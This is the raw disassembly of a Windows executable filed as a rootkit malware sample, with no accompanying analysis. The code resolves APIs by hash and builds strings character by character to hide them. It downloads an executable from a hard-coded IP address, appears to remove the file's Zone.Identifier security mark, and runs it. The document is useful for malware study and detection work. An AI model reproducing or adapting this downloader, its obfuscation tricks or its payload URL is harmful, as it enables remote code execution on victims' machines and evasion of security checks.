
malware_samples/rootkit/e0de4e3c9dee9877c78832ac9ebe3fbd2de45026896d6fc2a5ca12f6b588a29a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	81 ec 0c 02 00 00    	sub    $0x20c,%esp
  401009:	68 d0 07 00 00       	push   $0x7d0
  40100e:	ff 15 88 40 40 00    	call   *0x404088
  401014:	68 03 80 00 00       	push   $0x8003
  401019:	ff 15 8c 40 40 00    	call   *0x40408c
  40101f:	68 78 41 40 00       	push   $0x404178
  401024:	6a 00                	push   $0x0
  401026:	6a 00                	push   $0x0
  401028:	ff 15 90 40 40 00    	call   *0x404090
  40102e:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  401034:	83 bd f4 fd ff ff 00 	cmpl   $0x0,-0x20c(%ebp)
  40103b:	75 08                	jne    0x401045
  40103d:	6a 01                	push   $0x1
  40103f:	ff 15 94 40 40 00    	call   *0x404094
  401045:	ff 15 98 40 40 00    	call   *0x404098
  40104b:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401050:	75 08                	jne    0x40105a
  401052:	6a 00                	push   $0x0
  401054:	ff 15 94 40 40 00    	call   *0x404094
  40105a:	e8 d1 17 00 00       	call   0x402830
  40105f:	0f b6 c0             	movzbl %al,%eax
  401062:	85 c0                	test   %eax,%eax
  401064:	74 0b                	je     0x401071
  401066:	68 88 13 00 00       	push   $0x1388
  40106b:	ff 15 88 40 40 00    	call   *0x404088
  401071:	68 04 01 00 00       	push   $0x104
  401076:	8d 8d f8 fd ff ff    	lea    -0x208(%ebp),%ecx
  40107c:	51                   	push   %ecx
  40107d:	68 84 41 40 00       	push   $0x404184
  401082:	ff 15 9c 40 40 00    	call   *0x40409c
  401088:	85 c0                	test   %eax,%eax
  40108a:	75 04                	jne    0x401090
  40108c:	33 c0                	xor    %eax,%eax
  40108e:	eb 4c                	jmp    0x4010dc
  401090:	68 98 41 40 00       	push   $0x404198
  401095:	8d 95 f8 fd ff ff    	lea    -0x208(%ebp),%edx
  40109b:	52                   	push   %edx
  40109c:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  4010a2:	50                   	push   %eax
  4010a3:	ff 15 40 41 40 00    	call   *0x404140
  4010a9:	8d 8d f8 fd ff ff    	lea    -0x208(%ebp),%ecx
  4010af:	51                   	push   %ecx
  4010b0:	ff 15 48 41 40 00    	call   *0x404148
  4010b6:	85 c0                	test   %eax,%eax
  4010b8:	74 20                	je     0x4010da
  4010ba:	6a 00                	push   $0x0
  4010bc:	6a 00                	push   $0x0
  4010be:	6a 00                	push   $0x0
  4010c0:	68 30 31 40 00       	push   $0x403130
  4010c5:	6a 00                	push   $0x0
  4010c7:	6a 00                	push   $0x0
  4010c9:	ff 15 a0 40 40 00    	call   *0x4040a0
  4010cf:	68 00 51 25 02       	push   $0x2255100
  4010d4:	ff 15 88 40 40 00    	call   *0x404088
  4010da:	33 c0                	xor    %eax,%eax
  4010dc:	8b e5                	mov    %ebp,%esp
  4010de:	5d                   	pop    %ebp
  4010df:	c2 10 00             	ret    $0x10
  4010e2:	cc                   	int3
  4010e3:	cc                   	int3
  4010e4:	cc                   	int3
  4010e5:	cc                   	int3
  4010e6:	cc                   	int3
  4010e7:	cc                   	int3
  4010e8:	cc                   	int3
  4010e9:	cc                   	int3
  4010ea:	cc                   	int3
  4010eb:	cc                   	int3
  4010ec:	cc                   	int3
  4010ed:	cc                   	int3
  4010ee:	cc                   	int3
  4010ef:	cc                   	int3
  4010f0:	55                   	push   %ebp
  4010f1:	8b ec                	mov    %esp,%ebp
  4010f3:	81 ec b4 09 00 00    	sub    $0x9b4,%esp
  4010f9:	e8 12 0d 00 00       	call   0x401e10
  4010fe:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  401104:	83 bd 84 fd ff ff 00 	cmpl   $0x0,-0x27c(%ebp)
  40110b:	75 05                	jne    0x401112
  40110d:	e9 97 07 00 00       	jmp    0x4018a9
  401112:	6a 00                	push   $0x0
  401114:	6a 01                	push   $0x1
  401116:	68 2d 2e 10 9b       	push   $0x9b102e2d
  40111b:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  401121:	50                   	push   %eax
  401122:	e8 99 0a 00 00       	call   0x401bc0
  401127:	83 c4 10             	add    $0x10,%esp
  40112a:	89 85 8c f8 ff ff    	mov    %eax,-0x774(%ebp)
  401130:	83 bd 8c f8 ff ff 00 	cmpl   $0x0,-0x774(%ebp)
  401137:	75 05                	jne    0x40113e
  401139:	e9 6b 07 00 00       	jmp    0x4018a9
  40113e:	8b 8d 8c f8 ff ff    	mov    -0x774(%ebp),%ecx
  401144:	51                   	push   %ecx
  401145:	6a 01                	push   $0x1
  401147:	68 cd 0d 6e 52       	push   $0x526e0dcd
  40114c:	8b 95 84 fd ff ff    	mov    -0x27c(%ebp),%edx
  401152:	52                   	push   %edx
  401153:	e8 68 0a 00 00       	call   0x401bc0
  401158:	83 c4 10             	add    $0x10,%esp
  40115b:	89 85 1c f9 ff ff    	mov    %eax,-0x6e4(%ebp)
  401161:	83 bd 1c f9 ff ff 00 	cmpl   $0x0,-0x6e4(%ebp)
  401168:	75 05                	jne    0x40116f
  40116a:	e9 3a 07 00 00       	jmp    0x4018a9
  40116f:	8b 85 8c f8 ff ff    	mov    -0x774(%ebp),%eax
  401175:	50                   	push   %eax
  401176:	6a 01                	push   $0x1
  401178:	68 4d a9 b4 c4       	push   $0xc4b4a94d
  40117d:	8b 8d 84 fd ff ff    	mov    -0x27c(%ebp),%ecx
  401183:	51                   	push   %ecx
  401184:	e8 37 0a 00 00       	call   0x401bc0
  401189:	83 c4 10             	add    $0x10,%esp
  40118c:	89 85 5c f8 ff ff    	mov    %eax,-0x7a4(%ebp)
  401192:	83 bd 5c f8 ff ff 00 	cmpl   $0x0,-0x7a4(%ebp)
  401199:	75 05                	jne    0x4011a0
  40119b:	e9 09 07 00 00       	jmp    0x4018a9
  4011a0:	ba 25 00 00 00       	mov    $0x25,%edx
  4011a5:	66 89 95 60 f8 ff ff 	mov    %dx,-0x7a0(%ebp)
  4011ac:	b8 61 00 00 00       	mov    $0x61,%eax
  4011b1:	66 89 85 62 f8 ff ff 	mov    %ax,-0x79e(%ebp)
  4011b8:	b9 70 00 00 00       	mov    $0x70,%ecx
  4011bd:	66 89 8d 64 f8 ff ff 	mov    %cx,-0x79c(%ebp)
  4011c4:	ba 70 00 00 00       	mov    $0x70,%edx
  4011c9:	66 89 95 66 f8 ff ff 	mov    %dx,-0x79a(%ebp)
  4011d0:	b8 64 00 00 00       	mov    $0x64,%eax
  4011d5:	66 89 85 68 f8 ff ff 	mov    %ax,-0x798(%ebp)
  4011dc:	b9 61 00 00 00       	mov    $0x61,%ecx
  4011e1:	66 89 8d 6a f8 ff ff 	mov    %cx,-0x796(%ebp)
  4011e8:	ba 74 00 00 00       	mov    $0x74,%edx
  4011ed:	66 89 95 6c f8 ff ff 	mov    %dx,-0x794(%ebp)
  4011f4:	b8 61 00 00 00       	mov    $0x61,%eax
  4011f9:	66 89 85 6e f8 ff ff 	mov    %ax,-0x792(%ebp)
  401200:	b9 25 00 00 00       	mov    $0x25,%ecx
  401205:	66 89 8d 70 f8 ff ff 	mov    %cx,-0x790(%ebp)
  40120c:	ba 5c 00 00 00       	mov    $0x5c,%edx
  401211:	66 89 95 72 f8 ff ff 	mov    %dx,-0x78e(%ebp)
  401218:	b8 77 00 00 00       	mov    $0x77,%eax
  40121d:	66 89 85 74 f8 ff ff 	mov    %ax,-0x78c(%ebp)
  401224:	b9 69 00 00 00       	mov    $0x69,%ecx
  401229:	66 89 8d 76 f8 ff ff 	mov    %cx,-0x78a(%ebp)
  401230:	ba 6e 00 00 00       	mov    $0x6e,%edx
  401235:	66 89 95 78 f8 ff ff 	mov    %dx,-0x788(%ebp)
  40123c:	b8 64 00 00 00       	mov    $0x64,%eax
  401241:	66 89 85 7a f8 ff ff 	mov    %ax,-0x786(%ebp)
  401248:	b9 72 00 00 00       	mov    $0x72,%ecx
  40124d:	66 89 8d 7c f8 ff ff 	mov    %cx,-0x784(%ebp)
  401254:	ba 78 00 00 00       	mov    $0x78,%edx
  401259:	66 89 95 7e f8 ff ff 	mov    %dx,-0x782(%ebp)
  401260:	b8 2e 00 00 00       	mov    $0x2e,%eax
  401265:	66 89 85 80 f8 ff ff 	mov    %ax,-0x780(%ebp)
  40126c:	b9 74 00 00 00       	mov    $0x74,%ecx
  401271:	66 89 8d 82 f8 ff ff 	mov    %cx,-0x77e(%ebp)
  401278:	ba 78 00 00 00       	mov    $0x78,%edx
  40127d:	66 89 95 84 f8 ff ff 	mov    %dx,-0x77c(%ebp)
  401284:	b8 74 00 00 00       	mov    $0x74,%eax
  401289:	66 89 85 86 f8 ff ff 	mov    %ax,-0x77a(%ebp)
  401290:	33 c9                	xor    %ecx,%ecx
  401292:	66 89 8d 88 f8 ff ff 	mov    %cx,-0x778(%ebp)
  401299:	68 04 01 00 00       	push   $0x104
  40129e:	8d 95 50 f6 ff ff    	lea    -0x9b0(%ebp),%edx
  4012a4:	52                   	push   %edx
  4012a5:	8d 85 60 f8 ff ff    	lea    -0x7a0(%ebp),%eax
  4012ab:	50                   	push   %eax
  4012ac:	ff 95 1c f9 ff ff    	call   *-0x6e4(%ebp)
  4012b2:	8d 8d 50 f6 ff ff    	lea    -0x9b0(%ebp),%ecx
  4012b8:	51                   	push   %ecx
  4012b9:	ff 95 5c f8 ff ff    	call   *-0x7a4(%ebp)
  4012bf:	83 f8 ff             	cmp    $0xffffffff,%eax
  4012c2:	74 05                	je     0x4012c9
  4012c4:	e9 e0 05 00 00       	jmp    0x4018a9
  4012c9:	c6 85 88 fd ff ff 75 	movb   $0x75,-0x278(%ebp)
  4012d0:	c6 85 89 fd ff ff 72 	movb   $0x72,-0x277(%ebp)
  4012d7:	c6 85 8a fd ff ff 6c 	movb   $0x6c,-0x276(%ebp)
  4012de:	c6 85 8b fd ff ff 6d 	movb   $0x6d,-0x275(%ebp)
  4012e5:	c6 85 8c fd ff ff 6f 	movb   $0x6f,-0x274(%ebp)
  4012ec:	c6 85 8d fd ff ff 6e 	movb   $0x6e,-0x273(%ebp)
  4012f3:	c6 85 8e fd ff ff 2e 	movb   $0x2e,-0x272(%ebp)
  4012fa:	c6 85 8f fd ff ff 64 	movb   $0x64,-0x271(%ebp)
  401301:	c6 85 90 fd ff ff 6c 	movb   $0x6c,-0x270(%ebp)
  401308:	c6 85 91 fd ff ff 6c 	movb   $0x6c,-0x26f(%ebp)
  40130f:	c6 85 92 fd ff ff 00 	movb   $0x0,-0x26e(%ebp)
  401316:	6a 00                	push   $0x0
  401318:	6a 00                	push   $0x0
  40131a:	8d 95 88 fd ff ff    	lea    -0x278(%ebp),%edx
  401320:	52                   	push   %edx
  401321:	ff 95 8c f8 ff ff    	call   *-0x774(%ebp)
  401327:	89 85 5c f9 ff ff    	mov    %eax,-0x6a4(%ebp)
  40132d:	83 bd 5c f9 ff ff 00 	cmpl   $0x0,-0x6a4(%ebp)
  401334:	75 05                	jne    0x40133b
  401336:	e9 6e 05 00 00       	jmp    0x4018a9
  40133b:	8b 85 8c f8 ff ff    	mov    -0x774(%ebp),%eax
  401341:	50                   	push   %eax
  401342:	6a 01                	push   $0x1
  401344:	68 10 a3 a3 07       	push   $0x7a3a310
  401349:	8b 8d 84 fd ff ff    	mov    -0x27c(%ebp),%ecx
  40134f:	51                   	push   %ecx
  401350:	e8 6b 08 00 00       	call   0x401bc0
  401355:	83 c4 10             	add    $0x10,%esp
  401358:	89 85 dc f8 ff ff    	mov    %eax,-0x724(%ebp)
  40135e:	83 bd dc f8 ff ff 00 	cmpl   $0x0,-0x724(%ebp)
  401365:	75 05                	jne    0x40136c
  401367:	e9 3d 05 00 00       	jmp    0x4018a9
  40136c:	8d 95 70 f9 ff ff    	lea    -0x690(%ebp),%edx
  401372:	52                   	push   %edx
  401373:	68 04 01 00 00       	push   $0x104
  401378:	ff 95 dc f8 ff ff    	call   *-0x724(%ebp)
  40137e:	85 c0                	test   %eax,%eax
  401380:	75 05                	jne    0x401387
  401382:	e9 22 05 00 00       	jmp    0x4018a9
  401387:	8b 85 8c f8 ff ff    	mov    -0x774(%ebp),%eax
  40138d:	50                   	push   %eax
  40138e:	6a 01                	push   $0x1
  401390:	68 59 96 5d 16       	push   $0x165d9659
  401395:	8b 8d 84 fd ff ff    	mov    -0x27c(%ebp),%ecx
  40139b:	51                   	push   %ecx
  40139c:	e8 1f 08 00 00       	call   0x401bc0
  4013a1:	83 c4 10             	add    $0x10,%esp
  4013a4:	89 85 d8 f8 ff ff    	mov    %eax,-0x728(%ebp)
  4013aa:	83 bd d8 f8 ff ff 00 	cmpl   $0x0,-0x728(%ebp)
  4013b1:	75 05                	jne    0x4013b8
  4013b3:	e9 f1 04 00 00       	jmp    0x4018a9
  4013b8:	8d 95 78 fb ff ff    	lea    -0x488(%ebp),%edx
  4013be:	52                   	push   %edx
  4013bf:	6a 00                	push   $0x0
  4013c1:	6a 00                	push   $0x0
  4013c3:	8d 85 70 f9 ff ff    	lea    -0x690(%ebp),%eax
  4013c9:	50                   	push   %eax
  4013ca:	ff 95 d8 f8 ff ff    	call   *-0x728(%ebp)
  4013d0:	85 c0                	test   %eax,%eax
  4013d2:	75 05                	jne    0x4013d9
  4013d4:	e9 d0 04 00 00       	jmp    0x4018a9
  4013d9:	6a 2e                	push   $0x2e
  4013db:	8d 8d 78 fb ff ff    	lea    -0x488(%ebp),%ecx
  4013e1:	51                   	push   %ecx
  4013e2:	e8 39 07 00 00       	call   0x401b20
  4013e7:	83 c4 08             	add    $0x8,%esp
  4013ea:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  4013f0:	83 bd 94 fd ff ff 00 	cmpl   $0x0,-0x26c(%ebp)
  4013f7:	75 05                	jne    0x4013fe
  4013f9:	e9 ab 04 00 00       	jmp    0x4018a9
  4013fe:	ba 2e 00 00 00       	mov    $0x2e,%edx
  401403:	66 89 95 64 f9 ff ff 	mov    %dx,-0x69c(%ebp)
  40140a:	b8 65 00 00 00       	mov    $0x65,%eax
  40140f:	66 89 85 66 f9 ff ff 	mov    %ax,-0x69a(%ebp)
  401416:	b9 78 00 00 00       	mov    $0x78,%ecx
  40141b:	66 89 8d 68 f9 ff ff 	mov    %cx,-0x698(%ebp)
  401422:	ba 65 00 00 00       	mov    $0x65,%edx
  401427:	66 89 95 6a f9 ff ff 	mov    %dx,-0x696(%ebp)
  40142e:	33 c0                	xor    %eax,%eax
  401430:	66 89 85 6c f9 ff ff 	mov    %ax,-0x694(%ebp)
  401437:	6a 0a                	push   $0xa
  401439:	8d 8d 64 f9 ff ff    	lea    -0x69c(%ebp),%ecx
  40143f:	51                   	push   %ecx
  401440:	8b 95 94 fd ff ff    	mov    -0x26c(%ebp),%edx
  401446:	52                   	push   %edx
  401447:	e8 64 06 00 00       	call   0x401ab0
  40144c:	83 c4 0c             	add    $0xc,%esp
  40144f:	8b 85 8c f8 ff ff    	mov    -0x774(%ebp),%eax
  401455:	50                   	push   %eax
  401456:	6a 01                	push   $0x1
  401458:	68 bb 47 e4 ea       	push   $0xeae447bb
  40145d:	8b 8d 5c f9 ff ff    	mov    -0x6a4(%ebp),%ecx
  401463:	51                   	push   %ecx
  401464:	e8 57 07 00 00       	call   0x401bc0
  401469:	83 c4 10             	add    $0x10,%esp
  40146c:	89 85 98 fd ff ff    	mov    %eax,-0x268(%ebp)
  401472:	83 bd 98 fd ff ff 00 	cmpl   $0x0,-0x268(%ebp)
  401479:	75 05                	jne    0x401480
  40147b:	e9 29 04 00 00       	jmp    0x4018a9
  401480:	ba 68 00 00 00       	mov    $0x68,%edx
  401485:	66 89 95 20 f9 ff ff 	mov    %dx,-0x6e0(%ebp)
  40148c:	b8 74 00 00 00       	mov    $0x74,%eax
  401491:	66 89 85 22 f9 ff ff 	mov    %ax,-0x6de(%ebp)
  401498:	b9 74 00 00 00       	mov    $0x74,%ecx
  40149d:	66 89 8d 24 f9 ff ff 	mov    %cx,-0x6dc(%ebp)
  4014a4:	ba 70 00 00 00       	mov    $0x70,%edx
  4014a9:	66 89 95 26 f9 ff ff 	mov    %dx,-0x6da(%ebp)
  4014b0:	b8 3a 00 00 00       	mov    $0x3a,%eax
  4014b5:	66 89 85 28 f9 ff ff 	mov    %ax,-0x6d8(%ebp)
  4014bc:	b9 2f 00 00 00       	mov    $0x2f,%ecx
  4014c1:	66 89 8d 2a f9 ff ff 	mov    %cx,-0x6d6(%ebp)
  4014c8:	ba 2f 00 00 00       	mov    $0x2f,%edx
  4014cd:	66 89 95 2c f9 ff ff 	mov    %dx,-0x6d4(%ebp)
  4014d4:	b8 31 00 00 00       	mov    $0x31,%eax
  4014d9:	66 89 85 2e f9 ff ff 	mov    %ax,-0x6d2(%ebp)
  4014e0:	b9 37 00 00 00       	mov    $0x37,%ecx
  4014e5:	66 89 8d 30 f9 ff ff 	mov    %cx,-0x6d0(%ebp)
  4014ec:	ba 38 00 00 00       	mov    $0x38,%edx
  4014f1:	66 89 95 32 f9 ff ff 	mov    %dx,-0x6ce(%ebp)
  4014f8:	b8 2e 00 00 00       	mov    $0x2e,%eax
  4014fd:	66 89 85 34 f9 ff ff 	mov    %ax,-0x6cc(%ebp)
  401504:	b9 31 00 00 00       	mov    $0x31,%ecx
  401509:	66 89 8d 36 f9 ff ff 	mov    %cx,-0x6ca(%ebp)
  401510:	ba 36 00 00 00       	mov    $0x36,%edx
  401515:	66 89 95 38 f9 ff ff 	mov    %dx,-0x6c8(%ebp)
  40151c:	b8 2e 00 00 00       	mov    $0x2e,%eax
  401521:	66 89 85 3a f9 ff ff 	mov    %ax,-0x6c6(%ebp)
  401528:	b9 35 00 00 00       	mov    $0x35,%ecx
  40152d:	66 89 8d 3c f9 ff ff 	mov    %cx,-0x6c4(%ebp)
  401534:	ba 34 00 00 00       	mov    $0x34,%edx
  401539:	66 89 95 3e f9 ff ff 	mov    %dx,-0x6c2(%ebp)
  401540:	b8 2e 00 00 00       	mov    $0x2e,%eax
  401545:	66 89 85 40 f9 ff ff 	mov    %ax,-0x6c0(%ebp)
  40154c:	b9 31 00 00 00       	mov    $0x31,%ecx
  401551:	66 89 8d 42 f9 ff ff 	mov    %cx,-0x6be(%ebp)
  401558:	ba 30 00 00 00       	mov    $0x30,%edx
  40155d:	66 89 95 44 f9 ff ff 	mov    %dx,-0x6bc(%ebp)
  401564:	b8 39 00 00 00       	mov    $0x39,%eax
  401569:	66 89 85 46 f9 ff ff 	mov    %ax,-0x6ba(%ebp)
  401570:	b9 2f 00 00 00       	mov    $0x2f,%ecx
  401575:	66 89 8d 48 f9 ff ff 	mov    %cx,-0x6b8(%ebp)
  40157c:	ba 33 00 00 00       	mov    $0x33,%edx
  401581:	66 89 95 4a f9 ff ff 	mov    %dx,-0x6b6(%ebp)
  401588:	b8 32 00 00 00       	mov    $0x32,%eax
  40158d:	66 89 85 4c f9 ff ff 	mov    %ax,-0x6b4(%ebp)
  401594:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  401599:	66 89 8d 4e f9 ff ff 	mov    %cx,-0x6b2(%ebp)
  4015a0:	ba 65 00 00 00       	mov    $0x65,%edx
  4015a5:	66 89 95 50 f9 ff ff 	mov    %dx,-0x6b0(%ebp)
  4015ac:	b8 78 00 00 00       	mov    $0x78,%eax
  4015b1:	66 89 85 52 f9 ff ff 	mov    %ax,-0x6ae(%ebp)
  4015b8:	b9 65 00 00 00       	mov    $0x65,%ecx
  4015bd:	66 89 8d 54 f9 ff ff 	mov    %cx,-0x6ac(%ebp)
  4015c4:	33 d2                	xor    %edx,%edx
  4015c6:	66 89 95 56 f9 ff ff 	mov    %dx,-0x6aa(%ebp)
  4015cd:	6a 00                	push   $0x0
  4015cf:	6a 00                	push   $0x0
  4015d1:	8d 85 78 fb ff ff    	lea    -0x488(%ebp),%eax
  4015d7:	50                   	push   %eax
  4015d8:	8d 8d 20 f9 ff ff    	lea    -0x6e0(%ebp),%ecx
  4015de:	51                   	push   %ecx
  4015df:	6a 00                	push   $0x0
  4015e1:	ff 95 98 fd ff ff    	call   *-0x268(%ebp)
  4015e7:	85 c0                	test   %eax,%eax
  4015e9:	74 05                	je     0x4015f0
  4015eb:	e9 b9 02 00 00       	jmp    0x4018a9
  4015f0:	c6 85 9c fd ff ff 75 	movb   $0x75,-0x264(%ebp)
  4015f7:	c6 85 9d fd ff ff 73 	movb   $0x73,-0x263(%ebp)
  4015fe:	c6 85 9e fd ff ff 65 	movb   $0x65,-0x262(%ebp)
  401605:	c6 85 9f fd ff ff 72 	movb   $0x72,-0x261(%ebp)
  40160c:	c6 85 a0 fd ff ff 33 	movb   $0x33,-0x260(%ebp)
  401613:	c6 85 a1 fd ff ff 32 	movb   $0x32,-0x25f(%ebp)
  40161a:	c6 85 a2 fd ff ff 2e 	movb   $0x2e,-0x25e(%ebp)
  401621:	c6 85 a3 fd ff ff 64 	movb   $0x64,-0x25d(%ebp)
  401628:	c6 85 a4 fd ff ff 6c 	movb   $0x6c,-0x25c(%ebp)
  40162f:	c6 85 a5 fd ff ff 6c 	movb   $0x6c,-0x25b(%ebp)
  401636:	c6 85 a6 fd ff ff 00 	movb   $0x0,-0x25a(%ebp)
  40163d:	6a 00                	push   $0x0
  40163f:	6a 00                	push   $0x0
  401641:	8d 95 9c fd ff ff    	lea    -0x264(%ebp),%edx
  401647:	52                   	push   %edx
  401648:	ff 95 8c f8 ff ff    	call   *-0x774(%ebp)
  40164e:	89 85 60 f9 ff ff    	mov    %eax,-0x6a0(%ebp)
  401654:	83 bd 60 f9 ff ff 00 	cmpl   $0x0,-0x6a0(%ebp)
  40165b:	75 05                	jne    0x401662
  40165d:	e9 47 02 00 00       	jmp    0x4018a9
  401662:	8b 85 8c f8 ff ff    	mov    -0x774(%ebp),%eax
  401668:	50                   	push   %eax
  401669:	6a 01                	push   $0x1
  40166b:	68 d6 0d 1d 20       	push   $0x201d0dd6
  401670:	8b 8d 60 f9 ff ff    	mov    -0x6a0(%ebp),%ecx
  401676:	51                   	push   %ecx
  401677:	e8 44 05 00 00       	call   0x401bc0
  40167c:	83 c4 10             	add    $0x10,%esp
  40167f:	89 85 58 f9 ff ff    	mov    %eax,-0x6a8(%ebp)
  401685:	83 bd 58 f9 ff ff 00 	cmpl   $0x0,-0x6a8(%ebp)
  40168c:	75 05                	jne    0x401693
  40168e:	e9 16 02 00 00       	jmp    0x4018a9
  401693:	ba 25 00 00 00       	mov    $0x25,%edx
  401698:	66 89 95 e4 f8 ff ff 	mov    %dx,-0x71c(%ebp)
  40169f:	b8 73 00 00 00       	mov    $0x73,%eax
  4016a4:	66 89 85 e6 f8 ff ff 	mov    %ax,-0x71a(%ebp)
  4016ab:	b9 3a 00 00 00       	mov    $0x3a,%ecx
  4016b0:	66 89 8d e8 f8 ff ff 	mov    %cx,-0x718(%ebp)
  4016b7:	ba 5a 00 00 00       	mov    $0x5a,%edx
  4016bc:	66 89 95 ea f8 ff ff 	mov    %dx,-0x716(%ebp)
  4016c3:	b8 6f 00 00 00       	mov    $0x6f,%eax
  4016c8:	66 89 85 ec f8 ff ff 	mov    %ax,-0x714(%ebp)
  4016cf:	b9 6e 00 00 00       	mov    $0x6e,%ecx
  4016d4:	66 89 8d ee f8 ff ff 	mov    %cx,-0x712(%ebp)
  4016db:	ba 65 00 00 00       	mov    $0x65,%edx
  4016e0:	66 89 95 f0 f8 ff ff 	mov    %dx,-0x710(%ebp)
  4016e7:	b8 2e 00 00 00       	mov    $0x2e,%eax
  4016ec:	66 89 85 f2 f8 ff ff 	mov    %ax,-0x70e(%ebp)
  4016f3:	b9 49 00 00 00       	mov    $0x49,%ecx
  4016f8:	66 89 8d f4 f8 ff ff 	mov    %cx,-0x70c(%ebp)
  4016ff:	ba 64 00 00 00       	mov    $0x64,%edx
  401704:	66 89 95 f6 f8 ff ff 	mov    %dx,-0x70a(%ebp)
  40170b:	b8 65 00 00 00       	mov    $0x65,%eax
  401710:	66 89 85 f8 f8 ff ff 	mov    %ax,-0x708(%ebp)
  401717:	b9 6e 00 00 00       	mov    $0x6e,%ecx
  40171c:	66 89 8d fa f8 ff ff 	mov    %cx,-0x706(%ebp)
  401723:	ba 74 00 00 00       	mov    $0x74,%edx
  401728:	66 89 95 fc f8 ff ff 	mov    %dx,-0x704(%ebp)
  40172f:	b8 69 00 00 00       	mov    $0x69,%eax
  401734:	66 89 85 fe f8 ff ff 	mov    %ax,-0x702(%ebp)
  40173b:	b9 66 00 00 00       	mov    $0x66,%ecx
  401740:	66 89 8d 00 f9 ff ff 	mov    %cx,-0x700(%ebp)
  401747:	ba 69 00 00 00       	mov    $0x69,%edx
  40174c:	66 89 95 02 f9 ff ff 	mov    %dx,-0x6fe(%ebp)
  401753:	b8 65 00 00 00       	mov    $0x65,%eax
  401758:	66 89 85 04 f9 ff ff 	mov    %ax,-0x6fc(%ebp)
  40175f:	b9 72 00 00 00       	mov    $0x72,%ecx
  401764:	66 89 8d 06 f9 ff ff 	mov    %cx,-0x6fa(%ebp)
  40176b:	33 d2                	xor    %edx,%edx
  40176d:	66 89 95 08 f9 ff ff 	mov    %dx,-0x6f8(%ebp)
  401774:	8d 85 78 fb ff ff    	lea    -0x488(%ebp),%eax
  40177a:	50                   	push   %eax
  40177b:	8d 8d e4 f8 ff ff    	lea    -0x71c(%ebp),%ecx
  401781:	51                   	push   %ecx
  401782:	8d 95 a8 fd ff ff    	lea    -0x258(%ebp),%edx
  401788:	52                   	push   %edx
  401789:	ff 95 58 f9 ff ff    	call   *-0x6a8(%ebp)
  40178f:	83 c4 0c             	add    $0xc,%esp
  401792:	33 c0                	xor    %eax,%eax
  401794:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
  401798:	8b 8d 8c f8 ff ff    	mov    -0x774(%ebp),%ecx
  40179e:	51                   	push   %ecx
  40179f:	6a 01                	push   $0x1
  4017a1:	68 9a de 4f 65       	push   $0x654fde9a
  4017a6:	8b 95 84 fd ff ff    	mov    -0x27c(%ebp),%edx
  4017ac:	52                   	push   %edx
  4017ad:	e8 0e 04 00 00       	call   0x401bc0
  4017b2:	83 c4 10             	add    $0x10,%esp
  4017b5:	89 85 e0 f8 ff ff    	mov    %eax,-0x720(%ebp)
  4017bb:	83 bd e0 f8 ff ff 00 	cmpl   $0x0,-0x720(%ebp)
  4017c2:	75 05                	jne    0x4017c9
  4017c4:	e9 e0 00 00 00       	jmp    0x4018a9
  4017c9:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  4017cf:	50                   	push   %eax
  4017d0:	ff 95 e0 f8 ff ff    	call   *-0x720(%ebp)
  4017d6:	8b 8d 8c f8 ff ff    	mov    -0x774(%ebp),%ecx
  4017dc:	51                   	push   %ecx
  4017dd:	6a 01                	push   $0x1
  4017df:	68 47 6c 85 5c       	push   $0x5c856c47
  4017e4:	8b 95 84 fd ff ff    	mov    -0x27c(%ebp),%edx
  4017ea:	52                   	push   %edx
  4017eb:	e8 d0 03 00 00       	call   0x401bc0
  4017f0:	83 c4 10             	add    $0x10,%esp
  4017f3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4017f6:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  4017fa:	75 05                	jne    0x401801
  4017fc:	e9 a8 00 00 00       	jmp    0x4018a9
  401801:	6a 44                	push   $0x44
  401803:	6a 00                	push   $0x0
  401805:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  40180b:	50                   	push   %eax
  40180c:	e8 cf 00 00 00       	call   0x4018e0
  401811:	83 c4 0c             	add    $0xc,%esp
  401814:	c7 85 90 f8 ff ff 44 	movl   $0x44,-0x770(%ebp)
  40181b:	00 00 00 
  40181e:	6a 10                	push   $0x10
  401820:	6a 00                	push   $0x0
  401822:	8d 8d 0c f9 ff ff    	lea    -0x6f4(%ebp),%ecx
  401828:	51                   	push   %ecx
  401829:	e8 b2 00 00 00       	call   0x4018e0
  40182e:	83 c4 0c             	add    $0xc,%esp
  401831:	8d 95 0c f9 ff ff    	lea    -0x6f4(%ebp),%edx
  401837:	52                   	push   %edx
  401838:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  40183e:	50                   	push   %eax
  40183f:	6a 00                	push   $0x0
  401841:	6a 00                	push   $0x0
  401843:	6a 00                	push   $0x0
  401845:	6a 00                	push   $0x0
  401847:	6a 00                	push   $0x0
  401849:	6a 00                	push   $0x0
  40184b:	6a 00                	push   $0x0
  40184d:	8d 8d 78 fb ff ff    	lea    -0x488(%ebp),%ecx
  401853:	51                   	push   %ecx
  401854:	ff 55 f0             	call   *-0x10(%ebp)
  401857:	85 c0                	test   %eax,%eax
  401859:	74 46                	je     0x4018a1
  40185b:	8b 95 8c f8 ff ff    	mov    -0x774(%ebp),%edx
  401861:	52                   	push   %edx
  401862:	6a 00                	push   $0x0
  401864:	68 b0 41 40 00       	push   $0x4041b0
  401869:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  40186f:	50                   	push   %eax
  401870:	e8 4b 03 00 00       	call   0x401bc0
  401875:	83 c4 10             	add    $0x10,%esp
  401878:	89 85 4c f6 ff ff    	mov    %eax,-0x9b4(%ebp)
  40187e:	83 bd 4c f6 ff ff 00 	cmpl   $0x0,-0x9b4(%ebp)
  401885:	74 1a                	je     0x4018a1
  401887:	8b 8d 0c f9 ff ff    	mov    -0x6f4(%ebp),%ecx
  40188d:	51                   	push   %ecx
  40188e:	ff 95 4c f6 ff ff    	call   *-0x9b4(%ebp)
  401894:	8b 95 10 f9 ff ff    	mov    -0x6f0(%ebp),%edx
